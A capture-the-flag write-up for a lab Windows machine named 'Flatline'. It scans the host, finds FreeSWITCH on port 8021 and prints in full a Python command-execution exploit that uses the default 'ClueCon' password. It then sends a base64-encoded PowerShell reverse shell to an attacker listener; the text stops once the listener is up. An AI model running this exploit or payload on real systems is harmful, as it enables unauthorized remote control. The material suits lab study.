---
How low are your morals?
---

# Flatline — Writeup

## Overview
### Flatline — Writeup
### Flatline — Writeup
![](https://cdn.pixabay.com/photo/2020/04/25/11/12/electrocardiogram-5090337_960_720.jpg)
What are the flags?
This machine may be slower than normal to boot up and carry out operations.

## Enumeration
```text
The approach taken on this challenge is a black-box approach. A black-box penetration test is when a vulnerability assessment on a target system is done with no internal knowledge of the target system. 

sudo — required to run -O
nmap — call nmap port scanner
10.10.173.161 — target host
-sS — TCP SYN scan
-sV — Service version detection
-Pn — Disable host discovery (no Ping)
-n — Never do DNS resolution
-O — OSdetection
```
```text
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -Pn -n -sS 10.10.173.161
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 15:45 EDT
Nmap scan report for 10.10.173.161
Host is up (0.20s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2022-09-24T19:33:40
|_Not valid after:  2023-03-26T19:33:40
|_ssl-date: 2022-09-25T19:45:54+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-09-25T19:45:52+00:00
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): AVtech embedded (87%)
Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   190.37 ms 10.18.0.1
2   202.78 ms 10.10.173.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.74 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -O -Pn -n -sS 10.10.173.161
```
```text
┌──(kali㉿kali)-[~]
└─$ ping 10.10.173.161     
PING 10.10.173.161 (10.10.173.161) 56(84) bytes of data.

OS Windows

FreeSWITCH
```
```text
┌──(kali㉿kali)-[~]
└─$ searchsploit FreeSWITCH                             
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)               | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                  | windows/remote/47799.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```text
┌──(kali㉿kali)-[~]
└─$ searchsploit -m windows/remote/47799.txt
  Exploit: FreeSWITCH 1.10.1 - Command Execution
      URL: https://www.exploit-db.com/exploits/47799
     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
File Type: Python script, ASCII text executable

Copied to: /home/kali/47799.txt
```
```text
┌──(kali㉿kali)-[~]
└─$ cat 47799.txt
```
```text
# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
```
```text
# Date: 2019-12-19
```
```text
# Exploit Author: 1F98D
```
```text
# Vendor Homepage: https://freeswitch.com/
```
```text
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
```
```text
# Version: 1.10.1
```
```text
# Tested on: Windows 10 (x64)
#
```
```text
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
```
```text
# it after authenticating. By default commands are not accepted from remote hosts.
#
```
```text
# -- Example --
```
```text
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
```
```text
# Authenticated
```
```text
# Content-Type: api/response
```
```text
# Content-Length: 20
#
```
```text
# nt authority\system
#

#!/usr/bin/python3

from socket import *
import sys

if len(sys.argv) != 3:
    print('Missing arguments')
    print('Usage: freeswitch-exploit.py <target> <cmd>')
    sys.exit(1)

ADDRESS=sys.argv[1]
CMD=sys.argv[2]
PASSWORD='ClueCon' # default password for FreeSWITCH

s=socket(AF_INET, SOCK_STREAM)
s.connect((ADDRESS, 8021))

response = s.recv(1024)
if b'auth/request' in response:
    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
    response = s.recv(1024)
    if b'+OK accepted' in response:
        print('Authenticated')
        s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
        response = s.recv(8096).decode()
        print(response)
    else:
        print('Authentication failed')
        sys.exit(1)
else:
    print('Not prompted for authentication, likely not vulnerable')
    sys.exit(1)   

FreeSWITCH is an open-source application server for real-time communication. The application will execute any system commands supplied by an authenticated user according to the exploit. It also shows,

    1. The default password ClueCon.
    2. api system “command” is used to communicate once authenticated.
    3. Press the enter key twice to send the commands to the API.

https://www.revshells.com/
```
```text
┌──(kali㉿kali)-[~]
└─$ nc 10.10.173.161 8021
Content-Type: auth/request

auth ClueCon

Content-Type: command/reply
Reply-Text: +OK accepted

api system whoami

Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic
api system "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQA4AC4AMQAuADcANwAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```
```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
whoami
